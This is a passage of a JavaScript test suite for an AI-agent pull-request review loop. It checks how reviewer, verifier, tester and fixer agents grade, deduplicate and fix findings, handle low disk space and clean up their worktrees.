    });
    expect(of('post').map((c) => c.label)).toEqual(['post:r1', 'post:r2', 'post:r3']);
    expect(of('post')[2]?.prompt).toContain('"severity": "minor"');
    expect(summary).not.toContain('reopened a second time');
    expect(summary).toContain('3 rounds reached');
    expect(result.complete).toBe(false);
  });

  it('downgrades by likelihood: unusual → at most minor, contrived → nit, a blocker never', async () => {
    const hole = {
      ...finding,
      severity: 'blocker',
      title: 'Branch name pasted unquoted into a shell',
    };
    const { of } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1'
          ? {
              findings: [
                blocking('Breaks only on Windows'),
                blocking('Needs a crafted input'),
                hole,
              ],
            }
          : { findings: [] },
      verify: ({ label }) =>
        label.includes('Windows')
          ? { valid: true, reason: 'real', likelihood: 'unusual' }
          : label.includes('Branch name')
            ? { valid: true, reason: 'real', severity: 'blocker', likelihood: 'contrived' }
            : { valid: true, reason: 'real', likelihood: 'contrived' },
      fix: fixOpen,
    });
    const post = of('post')[0]?.prompt ?? '';
    const grades = Object.fromEntries(
      JSON.parse(post.slice(post.indexOf('FINDINGS:\n') + 'FINDINGS:\n'.length)).map((f) => [
        f.title,
        f.severity,
      ]),
    );
    expect(grades).toEqual({
      'Breaks only on Windows': 'minor',
      'Needs a crafted input': 'nit',
      [hole.title]: 'blocker',
    });
    // only the blocker is fixed
    expect(of('fix')).toHaveLength(1);
    expect(of('fix')[0].prompt).toContain(hole.title);
    expect(of('fix')[0].prompt).not.toContain('Needs a crafted input');
  });

  it('has verifiers grade by the strict rubric and give every likelihood', async () => {
    const { of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    const verify = of('verify')[0];
    const verdict = verify?.opts.schema.properties.verdicts.items;
    // the verifier's grade, never the reviewer's, is the one that reaches the fixer
    expect(verdict.required).toEqual(expect.arrayContaining(['severity', 'likelihood']));
    expect(verdict.properties.severity.description).toContain('A missing test is NEVER');
    expect(verdict.properties.likelihood.description).not.toContain('a crafted input');
    expect(verdict.properties.likelihood.description).toContain(
      'Input an untrusted party controls (PR text, branch names, file contents) is ordinary: it never makes a security hole contrived.',
    );
    expect(verify?.prompt).toContain("grade EVERY item's likelihood");
    // and knows that the likelihood cap spares a blocker (see graded)
    expect(verify?.prompt).toContain('a "blocker" keeps its grade whatever the likelihood');
    expect(verify?.prompt).toContain('never a contrived failure');
  });

  it('reviews only once, with no fixer, when the PR changes the review loop itself', async () => {
    const { result, summary, of } = await runLoop({
      files: () => ({ files: ['.claude/workflows/review-loop-run.js', 'tools/check.mjs'] }),
      review: reviewerFinds([1]),
    });
    expect(of('fix')).toHaveLength(0);
    expect(of('review').some((c) => c.label.endsWith(':r2'))).toBe(false);
    expect(summary).toContain('review-only: this PR changes the review loop itself');
    expect(result.complete).toBe(false);
  });

  it('reviews only once, with no fixer, when the changed files cannot be listed', async () => {
    for (const files of [
      () => ({ files: [], error: 'HTTP 502' }),
      () => null,
      () => ({ files: [] }),
      // a partial list next to an error may leave out the loop's own files
      () => ({ files: ['tools/check.mjs'], error: 'HTTP 502 on page 2' }),
      // the files API lists at most 3000: the rest is cut off
      () => ({ files: Array.from({ length: 3000 }, (_, i) => `gen/f${i}.ts`) }),
    ]) {
      const { result, summary, of } = await runLoop({ files, review: reviewerFinds([1]) });
      expect(of('fix')).toHaveLength(0);
      expect(summary).toContain("review-only: the PR's changed files could not be listed");
      expect(result.complete).toBe(false);
    }
  });

  it('lists the changed files from the files API, which also works for a PR too large to diff', async () => {
    const { of } = await runLoop({
      files: () => ({ files: Array.from({ length: 2999 }, (_, i) => `gen/f${i}.ts`) }),
      review: reviewerFinds([1]),
      fix: fixOpen,
    });
    // `state --files` lists them from the files API (see pr-review.test.mjs)
    expect(of('state')[0]?.prompt).toContain('node tools/pr-review.mjs state --pr 7 --files');
    expect(of('fix')).toHaveLength(1);
  });

  it('stops cleanly before a round when disk space or inodes are low', async () => {
    for (const disk of [
      () => ({ freeGb: 1.5, inodeFreePct: 80 }),
      () => ({ freeGb: 100, inodeFreePct: 5 }),
    ]) {
      const { result, summary, of } = await runLoop({ disk });
      expect(of('review')).toHaveLength(0);
      expect(summary).toContain('low disk space before round 1');
      expect(result.complete).toBe(false);
    }
    // a 1 TB disk 81% used still has ~190 GB free
    const big = await runLoop({ disk: () => ({ freeGb: 190, inodeFreePct: 90 }) });
    expect(big.result.complete).toBe(true);
    // exactly at the floors: enough
    const floor = await runLoop({ disk: () => ({ freeGb: 2, inodeFreePct: 20 }) });
    expect(floor.summary).not.toContain('low disk space');
    expect(floor.result.complete).toBe(true);
  });

  it('says it could not check disk space, instead of calling it low, when the check fails', async () => {
    for (const disk of [() => ({ error: 'df: permission denied' }), () => null]) {
      const { result, summary, of } = await runLoop({ disk });
      expect(of('review')).toHaveLength(0);
      expect(summary).toContain('could not check disk space before round 1');
      expect(summary).not.toContain('low disk space');
      expect(result.complete).toBe(false);
    }
  });

  it('never blocks on a hands-on check that needs a human', async () => {
    const { result, summary } = await runLoop({
      tester: () => ({
        findings: [],
        tested: [
          ...TESTED,
          {
            claimOrArea: 'template smoke test',
            stepsOrCommand: 'needs TEMPLATE_MAINTENANCE=true',
            result: 'needs-human',
            evidence: 'repository variable',
          },
        ],
      }),
    });
    expect(result.complete).toBe(true);
    expect(summary).toContain('**needs a human** · template smoke test');
  });

  it('never ends ✅ when nothing the tester ran passed', async () => {
    const { result, summary } = await runLoop({
      tester: () => ({ findings: [], tested: [{ ...TESTED[0], result: 'n/a', evidence: '-' }] }),
    });
    expect(result.complete).toBe(false);
    expect(summary).toContain('tester (nothing it ran passed)');
    expect(summary).not.toContain('✅');
  });

  it('lists a check an earlier tester said needs a human until a later tester reports it again', async () => {
    const smoke = {
      claimOrArea: 'template smoke test',
      stepsOrCommand: 'needs TEMPLATE_MAINTENANCE=true',
      result: 'needs-human',
      evidence: 'repository variable',
    };
    const run = (round2) =>
      runLoop({
        review: reviewerFinds([1]),
        tester: ({ label }) => ({
          findings: [],
          tested: label.endsWith(':r1') ? [...TESTED, smoke] : round2,
        }),
        fix: fixOpen,
      });
    // round 2's tester leaves it out: still listed
    const { result, summary } = await run(TESTED);
    expect(result.complete).toBe(true);
    expect(summary).toContain('**Hands-on testing** (round 2');
    expect(summary).toContain('**Earlier hands-on checks that need a human:**');
    expect(summary).toContain(
      '- **needs a human** · template smoke test · `needs TEMPLATE_MAINTENANCE=true` · repository variable (round 1)',
    );
    // round 2's tester ran it and it passed: the latest report decides
    const passed = await run([...TESTED, { ...smoke, result: 'pass', evidence: 'ran it' }]);
    expect(passed.result.complete).toBe(true);
    expect(passed.summary).not.toContain('**Earlier hands-on checks that need a human:**');
    expect(passed.summary).toContain('- pass · template smoke test');
  });

  it('stops counting an earlier failure once a later tester finds it needs a human', async () => {
    const counts = {
      claimOrArea: 'PR says 134 tools tests',
      stepsOrCommand: 'pnpm check --all',
      result: 'fail',
      evidence: '186 tools tests ran',
    };
    const { result, summary, of } = await runLoop({
      tester: ({ label }) =>
        label.endsWith(':r1')
          ? { findings: [finding], tested: [...TESTED, counts] }
          : { findings: [], tested: [...TESTED, { ...counts, result: 'needs-human' }] },
      fix: fixOpen,
    });
    const retest = of('review').find((c) => c.label === 'review:checker:r2')?.prompt;
    expect(retest).toContain('then report them "needs-human"');
    expect(result.complete).toBe(true);
    expect(summary).toContain('✅');
    expect(summary).toContain('- **needs a human** · PR says 134 tools tests');
  });

  it('verifies findings in batches of up to 6, not one agent per finding', async () => {
    const seven = Array.from({ length: 7 }, (_, i) => blocking(`Issue ${i}`));
    const { calls } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1' ? { findings: seven } : { findings: [] },
    });
    const batches = new Set(
      calls.filter((c) => c.batchLabel?.endsWith(':r1')).map((c) => c.batchLabel),
    );
    expect(batches.size).toBe(2);
  });
});

describe('review-loop round-5 fixes', () => {
  it('drops a reworded repeat of a known finding (verifier: duplicateOf "known: …")', async () => {
    const reworded = { ...finding, title: 'Drift hidden by gate order' };
    const { of } = await runLoop({
      threads: () => ({
        count: 1,
        threads: [
          {
            id: 'rl-1',
            title: finding.title,
            path: finding.path,
            line: null,
            resolved: true,
            wontfix: true,
          },
        ],
      }),
      review: ({ label }) =>
        label === 'review:correctness:r1' ? { findings: [reworded] } : { findings: [] },
      verify: () => ({
        valid: true,
        reason: 'same issue',
        duplicateOf: `known: ${finding.path}: ${finding.title}`,
      }),
    });
    expect(of('post')).toHaveLength(0);
  });

  it('never reports ✅ when the tester saw a failure that no confirmed finding covers', async () => {
    const { result, summary } = await runLoop({
      tester: () => ({
        findings: [{ ...finding, title: 'pnpm check --all fails' }],
        tested: [
          {
            claimOrArea: 'pnpm check --all',
            stepsOrCommand: 'pnpm check --all',
            result: 'fail',
            evidence: 'exit 1',
          },
        ],
      }),
      verify: () => ({ valid: false, reason: 'could not reproduce' }),
    });
    expect(result.complete).toBe(false);
    expect(summary).toContain('tester saw a failure: pnpm check --all');
  });

  it('tells worktree agents to restore their starting commit so the worktree is auto-removed', async () => {
    const { of } = await runLoop();
    const reviewer = of('review')[0];
    expect(reviewer.prompt).toContain('\n  git rev-parse HEAD\n');
    expect(reviewer.prompt).toContain('git checkout -q --detach <the starting sha you noted>');
    // no shell variable (it does not survive between an agent's commands) and one command per line
    expect(reviewer.prompt).not.toMatch(/\$ORIG|ORIG=/);
    const setup = reviewer.prompt.slice(reviewer.prompt.indexOf('throwaway git worktree'));
    for (const line of setup.split('\n').filter((l) => /^ {2}(git|CI=|pnpm)/.test(l)))
      expect(line).not.toMatch(/&&|;|\|/);
  });

  it('tells worktree agents to stop what they started before resetting the worktree', async () => {
    const { of } = await runLoop({
      review: reviewerFinds([1]),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    // every agent that gets a worktree: reviewers, the tester, verifiers and the fixer
    for (const c of [...of('review'), ...of('verify'), ...of('fix')]) {
      const at = (text) => c.prompt.indexOf(text);
      const steps = [
        'Stop every server and background process you started',
        'has a "teardown" script, run it',
        '\n  pnpm teardown\n',
        '\n  git reset -q --hard\n',
      ];
      for (const step of steps) expect(at(step), `${c.label}: ${step}`).toBeGreaterThan(0);
      // in this order: servers first, then the repo's teardown, then git
      expect(steps.map(at), c.label).toEqual(steps.map(at).toSorted((a, b) => a - b));
    }
  });
});

/** The fixer fixes every open finding its prompt lists, and pushes. */
const fixOpen = (call) => {
  const start = call.prompt.indexOf('[', call.prompt.indexOf('Open BLOCKING findings (JSON'));
  const open = JSON.parse(
    call.prompt.slice(start, call.prompt.indexOf('\nMinor/nit findings on the PR')),
  );
  return {
    checkPassed: true,
    commit: push(call),
    resolutions: open.map((f) => ({ path: f.path, title: f.title, status: 'fixed' })),
  };
};

describe('review-loop round-1 fixes', () => {
  const minor = { ...finding, severity: 'minor', title: 'Wording could be clearer' };

  it('keeps every hands-on failure a gap, even next to an unrelated confirmed tester finding', async () => {
    const failing = { ...finding, title: 'pnpm check --all fails' };
    const agentsMd = { ...minor, path: 'AGENTS.md', title: 'Stale wording' };
    const { result, summary } = await runLoop({
      tester: ({ label }) => ({
        findings: label.endsWith(':r1') ? [failing, agentsMd] : [],
        tested: [{ ...TESTED[0], result: 'fail', evidence: 'exit 1' }],
      }),
      verify: ({ label }) =>
        label.includes(failing.title)
          ? { valid: false, reason: 'could not reproduce' }
          : { valid: true, reason: 'confirmed' },
      fix: fixOpen,
    });
    expect(result.rounds[0]?.gaps).toContain('tester saw a failure: pnpm check --all');
    expect(result.complete).toBe(false);
    expect(summary).not.toContain('✅');
    expect(summary).toContain('- **FAIL** · pnpm check --all');
  });

  it('has a reviewer that gave no answer review the WHOLE PR in the next round, after fixes too', async () => {
    for (const [fixStat, kind, others] of [
      [BIG_FIX, 'fixes only; whole PR: consistency', ['correctness', 'tests', 'tester']],
      [undefined, 'fix check; whole PR: consistency', ['checker']],
    ]) {
      const { result, of } = await runLoop({
        review: (call) =>
          call.label === 'review:consistency:r1' ? null : reviewerFinds([1])(call),
        fix: fixOpen,
        ...(fixStat && { fixStat }),
      });
      const r2 = (key) => of('review').find((c) => c.label === `review:${key}:r2`)?.prompt;
      expect(r2('consistency'), kind).not.toContain('FOLLOW-UP round');
      expect(r2('consistency'), kind).toContain('Review ONLY what this PR changes');
      expect(
        of('review')
          .filter(inRound(2))
          .map((c) => c.label.split(':')[1]),
      ).toEqual(expect.arrayContaining(others));
      if (fixStat) expect(r2('correctness')).toContain('FOLLOW-UP round');
      else expect(r2('correctness')).toBeUndefined();
      expect(result.rounds.map((r) => r.kind)).toEqual(['full', kind]);
      expect(result.rounds[1]?.gaps).toEqual([]);
      expect(result.complete).toBe(true);
    }
  });

  it('verifies a finding that got no verdict again next round, even when no reviewer repeats it', async () => {
    const other = { ...finding, title: 'Another bug' };
    let verdicts = 0;
    const { result, of } = await runLoop({
      review: ({ label }) =>
        label === 'review:correctness:r1' ? { findings: [finding, other] } : { findings: [] },
      verify: ({ label }) =>
        label.includes(finding.title) && ++verdicts === 1 ? null : { valid: true, reason: 'ok' },
      fix: fixOpen,
    });
    expect(of('verify').filter((c) => c.label.includes(finding.title))).toHaveLength(2);
    expect(of('post').map((c) => c.label)).toEqual(['post:r1', 'post:r2']);
    expect(of('post')[1]?.prompt).toContain(finding.title);
    expect(result.complete).toBe(true);
  });

  it("counts a thread's severity from an earlier run, and an unknown one as blocking", async () => {
    for (const [severity, complete] of [
      ['major', false],
      [null, false],
      ['minor', true],
    ]) {
      const { result, summary } = await runLoop({
        threads: () => ({
          count: 1,
          threads: [
            {
              id: 'rl-old',
              title: 'Old finding',
              severity,
              path: 'tools/a.mjs',
              line: 3,
              resolved: false,
              wontfix: false,
            },
          ],
        }),
        fix: ({ state }) => ({
          checkPassed: true,
          commit: state.sha, // nothing done
          resolutions: [{ path: 'tools/a.mjs', title: 'Old finding', status: 'not-done' }],
        }),
      });
      expect(result.complete, String(severity)).toBe(complete);
      expect(summary.includes('✅'), String(severity)).toBe(complete);
    }
  });

  it('reopens a RESOLVED finding that a reviewer reports again in other words', async () => {
    const { result, of } = await runLoop({
      threads: () => ({
        count: 1,
        threads: [
          {
            id: 'rl-1',
            title: finding.title,
            severity: 'major',
            path: finding.path,
            line: null,
            resolved: true,
            wontfix: false,
          },
        ],
      }),
      review: ({ label }) =>
        label === 'review:correctness:r1'
          ? {
              findings: [
                { ...finding, severity: 'blocker', title: 'Drift still hidden after the fix' },
              ],
            }
          : { findings: [] },
      verify: () => ({
        valid: true,
        severity: 'blocker',
        reason: 'still present',
        duplicateOf: `known: ${finding.path}: ${finding.title}`,
      }),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    expect(of('post')).toHaveLength(1);
    expect(of('post')[0]?.prompt).toContain('STILL present');
    expect(of('post')[0]?.prompt).toContain(`"title": "${finding.title}"`);
    expect(of('fix')[0]?.prompt).toContain(finding.title);
    expect(result.complete).toBe(false);
  });

  it('matches batched verdicts to findings by index, and never shifts them', async () => {
    const [a, b] = [
      { ...finding, title: 'Real bug' },
      { ...finding, title: 'False positive' },
    ];
    const review = ({ label }) =>
      label === 'review:correctness:r1' ? { findings: [a, b] } : { findings: [] };
    // in another order, with the indices: each verdict still lands on its own finding
    const reordered = await runLoop({
      review,
      verifyBatch: () => ({
        verdicts: [
          { index: 2, valid: false, reason: 'not a bug' },
          { index: 1, valid: true, reason: 'confirmed' },
        ],
      }),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    expect(reordered.of('post')[0]?.prompt).toContain('Real bug');
    expect(reordered.of('post')[0]?.prompt).not.toContain('False positive');
    // one verdict short and without indices: nothing is judged, nothing misassigned
    const short = await runLoop({
      review,
      verifyBatch: () => ({ verdicts: [{ valid: false, reason: 'merged the two' }] }),
    });
    expect(short.of('post')).toHaveLength(0);
    expect(short.result.rounds[0]?.gaps).toEqual([
      'verifier of tools/check.mjs: Real bug',
      'verifier of tools/check.mjs: False positive',
    ]);
  });

  it('stops when the fix pass changed nothing, instead of re-reviewing the same head', async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      fix: ({ state }) => ({
        checkPassed: true,
        commit: state.sha,
        resolutions: [{ path: finding.path, title: finding.title, status: 'wontfix', note: 'n/a' }],
      }),
    });
    expect(of('review').filter(inRound(2))).toHaveLength(0);
    expect(summary).toContain("the fix pass changed nothing (0 fixed, 1 won't fix, 0 left open)");
    expect(summary).toContain('✅');
    expect(result.complete).toBe(true);
  });
});

describe('review-loop round-2 fixes', () => {
  const minor = { ...finding, severity: 'minor', title: 'Wording could be clearer' };
  const dryRun = {
    claimOrArea: 'bootstrap --dry-run lists the files',
    stepsOrCommand: 'scripts/bootstrap --dry-run',
    result: 'fail',
    evidence: 'it listed nothing',
  };

  it('keeps a hands-on failure a gap until a later tester reports that check passing', async () => {
    for (const { result1, round2, complete } of [
      { result1: 'fail', round2: TESTED, complete: false }, // round 2's tester leaves it out
      { result1: 'could-not-run', round2: TESTED, complete: false },
      {
        result1: 'fail',
        round2: [...TESTED, { ...dryRun, result: 'pass', evidence: '12 files' }],
        complete: true,
      },
    ]) {
      const { result, summary, of } = await runLoop({
        review: reviewerFinds([1]),
        tester: ({ label }) =>
          label.endsWith(':r1')
            ? {
                findings: [
                  { ...finding, path: 'scripts/bootstrap', title: 'Dry run lists nothing' },
                ],
                tested: [...TESTED, { ...dryRun, result: result1 }],
              }
            : { findings: [], tested: round2 },
        verify: ({ label }) =>
          label.includes('Dry run')
            ? { valid: false, reason: 'could not reproduce' }
            : { valid: true, reason: 'confirmed' },
        fix: fixOpen,
      });
      const label = `${result1} → ${round2.length}`;
      // the fix checker is asked to run it again
      expect(of('review').find((c) => c.label === 'review:checker:r2')?.prompt, label).toContain(
        `- bootstrap --dry-run lists the files (round 1: ${result1}; ran: scripts/bootstrap --dry-run)`,
      );
      expect(result.complete, label).toBe(complete);
      expect(summary.includes('✅'), label).toBe(complete);
      if (complete) continue;
      expect(result.rounds[1]?.gaps, label).toEqual([
        `tester ${result1 === 'fail' ? 'saw a failure' : 'could not run'}: bootstrap --dry-run lists the files (round 1)`,
      ]);
      expect(summary, label).toContain('**Earlier hands-on checks not seen passing since:**');
      expect(summary, label).toContain(
        '· bootstrap --dry-run lists the files · `scripts/bootstrap --dry-run` · it listed nothing (round 1)',
      );
    }
  });

  it('adds no review round for a hands-on failure when only minor/nit findings are open', async () => {
    const claim = {
      claimOrArea: 'PR says 134 tools tests',
      stepsOrCommand: 'pnpm check --all',
      result: 'fail',
      evidence: '186 tools tests ran',
    };
    const { result, summary, of } = await runLoop(
      {
        review: ({ label }) =>
          label.startsWith('review:correctness') ? { findings: [minor] } : { findings: [] },
        tester: () => ({
          findings: [
            { ...finding, severity: 'nit', path: 'README.md', title: 'Stale test counts' },
          ],
          tested: [...TESTED, claim],
        }),
        fix: (call) => ({
          checkPassed: true,
          commit: push(call),
          resolutions: [{ path: minor.path, title: minor.title, status: 'fixed' }],
        }),
      },
      { pr: 7, maxRounds: 5 },
    );
    expect(of('review')).toHaveLength(4);
    expect(of('fix')).toHaveLength(0); // minor/nit findings are never fixed by the loop
    expect(summary).toContain("the tester's report would repeat at the same head");
    expect(summary).toContain('tester saw a failure: PR says 134 tools tests');
    // the failure was never seen passing
    expect(summary).toContain('⚠️');
    expect(result.complete).toBe(false);
  });

  it('keeps a blocking finding open when the fixer calls it fixed without a fix commit', async () => {
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      fix: ({ state }) => ({
        checkPassed: true,
        commit: state.sha,
        resolutions: [{ path: finding.path, title: finding.title, status: 'fixed' }],
      }),
    });
    expect(of('fix')[0]?.prompt).toContain('if you changed nothing: then nothing is "fixed"');
    expect(of('review').filter(inRound(2))).toHaveLength(0);
    expect(summary).toContain("the fix pass changed nothing (0 fixed, 0 won't fix, 1 left open)");
    expect(summary).not.toContain('✅');
    expect(result).toMatchObject({
      complete: false,
      open: ['tools/check.mjs: Gate order hides drift'],
    });
  });

  it("stops when the fix pass changed nothing and the tester's report would repeat", async () => {
    const tested = [
      ...TESTED,
      {
        claimOrArea: 'the notes page',
        stepsOrCommand: 'open /notes',
        result: 'could-not-run',
        evidence: 'no browser tools',
      },
    ];
    const { result, summary, of } = await runLoop({
      review: reviewerFinds([1]),
      tester: () => ({ findings: [], tested }),
      fix: ({ state }) => ({
        checkPassed: true,
        commit: state.sha,
        resolutions: [{ path: finding.path, title: finding.title, status: 'not-done' }],
      }),
    });
    expect(of('review')).toHaveLength(4); // not every reviewer again on the same head
    expect(summary).toContain(
      "the fix pass changed nothing (0 fixed, 0 won't fix, 1 left open), and the tester's report would repeat at the same head",
    );
    expect(result.complete).toBe(false);
  });

  it('has a tester that reported nothing it ran test the WHOLE PR in the next round', async () => {
    const { result, of } = await runLoop({
      review: reviewerFinds([1]),
      tester: ({ label }) => ({ findings: [], tested: label.endsWith(':r1') ? [] : TESTED }),
      fix: fixOpen,
    });
    const r2 = (key) => of('review').find((c) => c.label === `review:${key}:r2`)?.prompt;
    expect(r2('checker')).toContain('You are the FIX CHECKER');
    expect(r2('correctness')).toBeUndefined();
    expect(r2('tester')).not.toContain('FOLLOW-UP round');
    expect(r2('tester')).toContain('Review ONLY what this PR changes');
    expect(result.rounds[0]?.gaps).toEqual(['tester (reported nothing it ran)']);
    expect(result.complete).toBe(true);
  });

  const resolvedThread = {
    id: 'rl-1',
    title: finding.title,
    severity: 'major',
    path: finding.path,
    line: null,
    resolved: true,
    wontfix: false,
  };
  const repeat = { ...finding, severity: 'blocker', title: 'Drift still hidden after the fix' };

  it('reopens a resolved finding however the verifier quotes it, and drops nothing it cannot name', async () => {
    for (const [ref, title] of [
      [`known: "${finding.path}: ${finding.title}"`, finding.title],
      [`known: \`${finding.path}\`: ${finding.title}`, finding.title],
      [`known: ${finding.title}.`, finding.title],
      [`Known: ${finding.path}: ${finding.title} (resolved)`, finding.title],
      [`known: - [resolved] ${finding.path}: ${finding.title}`, finding.title],
      // names no known finding (truncated): the finding stands, as a new one
      [`known: ${finding.path}: Gate order hides`, repeat.title],
    ]) {
      const { result, of } = await runLoop({
        threads: () => ({ count: 1, threads: [resolvedThread] }),
        review: ({ label }) =>
          label === 'review:correctness:r1' ? { findings: [repeat] } : { findings: [] },
        verify: () => ({ valid: true, severity: 'blocker', reason: 'still', duplicateOf: ref }),
        fix: () => ({ checkPassed: false, resolutions: [] }),
      });
      expect(of('post'), ref).toHaveLength(1);
      expect(of('post')[0]?.prompt, ref).toContain(`"title": "${title}"`);
      expect(result.complete, ref).toBe(false);
    }
  });

  it("reopens a resolved finding at its own path, without the new report's line", async () => {
    const { of } = await runLoop({
      threads: () => ({
        count: 1,
        threads: [{ ...resolvedThread, path: '.github/workflows/ci.yml', title: 'CI is stale' }],
      }),
      review: ({ label }) =>
        label === 'review:correctness:r1'
          ? { findings: [{ ...finding, line: 40, title: 'CI still stale' }] }
          : { findings: [] },
      verify: () => ({
        valid: true,
        reason: 'still stale',
        duplicateOf: 'known: .github/workflows/ci.yml: CI is stale',
      }),
      fix: () => ({ checkPassed: false, resolutions: [] }),
    });
    const post = of('post')[0]?.prompt ?? '';
    expect(post).toContain('"path": ".github/workflows/ci.yml"');
    expect(post).toContain('"title": "CI is stale"');
    expect(post).not.toContain('"line": 40');
  });
});

/** A hands-on check with the given result (and fields). */
const check = (result, extra = {}) => ({
  claimOrArea: 'db-up in a second worktree',
  stepsOrCommand: 'pnpm nx run db:db-up',
  result,
  evidence: 'port taken',
  ...extra,
});

describe('review-loop: round 1 carries the value, a fix gets a check (PRs #3 and #4)', () => {
  const minor = { ...finding, severity: 'minor', title: 'Wording could be clearer' };
  const fixNoted = (call) => ({
    checkPassed: true,
    commit: push(call),
    resolutions: [
      { path: finding.path, title: finding.title, status: 'fixed', note: 'moved the gate' },
    ],
  });

  it('asks round 1 for every blocker/major and at most 8 minor/nit, and the tester to start from CI', async () => {
    const { of } = await runLoop();
    const r1 = (key) => of('review').find((c) => c.label === `review:${key}:r1`)?.prompt;
    for (const key of ['correctness', 'tests', 'consistency', 'tester'])
      expect(r1(key), key).toContain(
        'Report EVERY blocker/major problem you find, and at\nmost 8 minor/nit ones.',
      );
    expect(r1('tester')).toContain('0. Start from CI: `gh pr checks 7`');
    expect(r1('tester')).toContain('gh pr checks 7 --watch');
  });

  it('checks a small fix with one fix checker instead of four reviewers', async () => {
    const { result, summary, of } = await runLoop({ review: reviewerFinds([1]), fix: fixNoted });
    const r2 = of('review').filter(inRound(2));
    expect(r2.map((c) => c.label)).toEqual(['review:checker:r2']);
    const prompt = r2[0].prompt;
    expect(prompt).toContain('You are the FIX CHECKER');
    expect(prompt).toContain(`pushed the commits ${SHA}..<the PR head>`);
    expect(prompt).toContain(`git diff ${SHA} HEAD`);
    expect(prompt).toContain('"title": "Gate order hides drift"');
    expect(prompt).toContain('"note": "moved the gate"');
    expect(prompt).toContain('claimOrArea "fix: <path>: <title>"');
    expect(prompt).toContain('gh pr checks 7 --watch');
    expect(prompt).not.toContain('FOLLOW-UP round');
    expect(r2[0].opts).toMatchObject({
      isolation: 'worktree',
      schema: { required: ['findings', 'tested'] },
    });
    // the state after the fix measured it from the reviewed head
    expect(of('state').find((c) => c.label === 'state:r2')?.prompt).toContain(`--base ${SHA}`);
    expect(result.rounds.map((r) => r.kind)).toEqual(['full', 'fix check']);
    expect(summary).toContain('✅');
    expect(result.complete).toBe(true);
  });

  it('has all four review a fix over budget, or one whose size is unknown', async () => {
    for (const [name, opts, args] of [
      ['over the default budget', { fixStat: BIG_FIX }, { pr: 7 }],
      ['size unknown', { fixStat: () => ({ error: 'bad object' }) }, { pr: 7 }],
      ['over a smaller budget', {}, { pr: 7, fixBudget: 5 }],
    ]) {
      const { result, of } = await runLoop(
        { review: reviewerFinds([1]), fix: fixOpen, ...opts },
        args,
      );
      const r2 = of('review').filter(inRound(2));
      expect(
        r2.map((c) => c.label.split(':')[1]).toSorted((a, b) => a.localeCompare(b)),
        name,
      ).toEqual(['consistency', 'correctness', 'tester', 'tests']);
      expect(r2[0]?.prompt, name).toContain('FOLLOW-UP round');
      expect(result.rounds[1]?.kind, name).toBe('fixes only');
    }
  });

  it('runs a fix checker that gave no answer again, at the same head and on the same fixes', async () => {
    const { result, of } = await runLoop({
      review: reviewerFinds([1]),
      checker: ({ label }) => (label.endsWith(':r2') ? null : { findings: [], tested: TESTED }),
      fix: fixNoted,
    });
    expect(
      of('review')
        .filter(inRound(3))
        .map((c) => c.label),
    ).toEqual(['review:checker:r3']);
    expect(of('review').find((c) => c.label === 'review:checker:r3')?.prompt).toContain(
      `pushed the commits ${SHA}..`,
    );
    expect(of('fix')).toHaveLength(1);
    expect(result.rounds[1]?.gaps).toEqual(['reviewer checker']);
    expect(result.rounds.map((r) => r.kind)).toEqual(['full', 'fix check', 'same head: checker']);
    expect(result.complete).toBe(true);
  });

  it('treats a failed check on a minor finding as a suggestion, and ends ✅', async () => {
    const { result, summary, of } = await runLoop({
      tester: ({ label }) =>
        label.endsWith(':r1')
          ? { findings: [minor], tested: [...TESTED, check('fail', { finding: minor.title })] }
          : { findings: [], tested: TESTED },
    });
    expect(of('fix')).toHaveLength(0);
    expect(result.rounds[0]?.gaps).toEqual([]);
    expect(summary).toContain('✅');
    expect(summary).toContain(
      '- fail (not blocking: its finding is minor/nit) · db-up in a second',
    );
    expect(result.complete).toBe(true);
  });

  it('keeps a failed check on a blocking finding a gap until the fix checker sees it pass', async () => {
    for (const { name, round2, complete } of [
      { name: 'passes', round2: [...TESTED, check('pass', { evidence: 'ok' })], complete: true },
      { name: 'left out', round2: TESTED, complete: false }, // not seen passing
    ]) {
      const { result, summary, of } = await runLoop({
        tester: () => ({
          findings: [finding],
          tested: [...TESTED, check('fail', { finding: finding.title })],
        }),
        checker: () => ({ findings: [], tested: round2 }),
        fix: fixNoted,
      });
      expect(result.rounds[0]?.gaps).toEqual(['tester saw a failure: db-up in a second worktree']);
      expect(of('review').find((c) => c.label === 'review:checker:r2')?.prompt).toContain(
        '- db-up in a second worktree (round 1: fail; ran: pnpm nx run db:db-up)',
      );
      expect(result.complete, name).toBe(complete);
      expect(summary.includes('✅'), name).toBe(complete);
    }
  });

  it('never blocks on a failed check whose finding was rejected, or duplicates a minor one', async () => {
    // graded major by the tester: as a duplicate it weighs what the minor original weighs
    const tester = { ...finding, title: 'Unclear wording (seen by hand)' };
    for (const { name, verify, why } of [
      {
        name: 'rejected',
        verify: ({ label }) =>
          label.includes('(seen by hand)')
            ? { valid: false, reason: 'cannot reproduce' }
            : { valid: true, reason: 'ok' },
        why: 'its finding was rejected',
      },
      {
        name: 'duplicate of a minor',
        verify: ({ label }) =>
          label.includes('(seen by hand)')
            ? { valid: true, reason: 'same', duplicateOf: `${minor.path}: ${minor.title}` }
            : { valid: true, reason: 'ok', severity: 'minor' },
        why: 'its finding is minor/nit',
      },
    ]) {
      const { result, summary } = await runLoop({
        review: ({ label }) =>
          label === 'review:correctness:r1' ? { findings: [minor] } : { findings: [] },
        tester: () => ({
          findings: [tester],
          tested: [...TESTED, check('fail', { finding: tester.title })],
        }),
        verify,
      });
      expect(result.rounds[0]?.gaps, name).toEqual([]);
      expect(summary, name).toContain(`- fail (not blocking: ${why})`);
      expect(result.complete, name).toBe(true);
    }
  });

  it('keeps a failed check a gap when it names no finding, or one nobody reported', async () => {
    for (const named of [undefined, 'Something nobody reported']) {
      const { result, summary } = await runLoop({
        tester: () => ({ findings: [], tested: [...TESTED, check('fail', { finding: named })] }),
      });
      expect(result.rounds[0]?.gaps, named).toEqual([
        'tester saw a failure: db-up in a second worktree',
      ]);
      expect(summary, named).toContain('- **FAIL** · db-up in a second worktree');
      expect(result.complete, named).toBe(false);
    }
  });

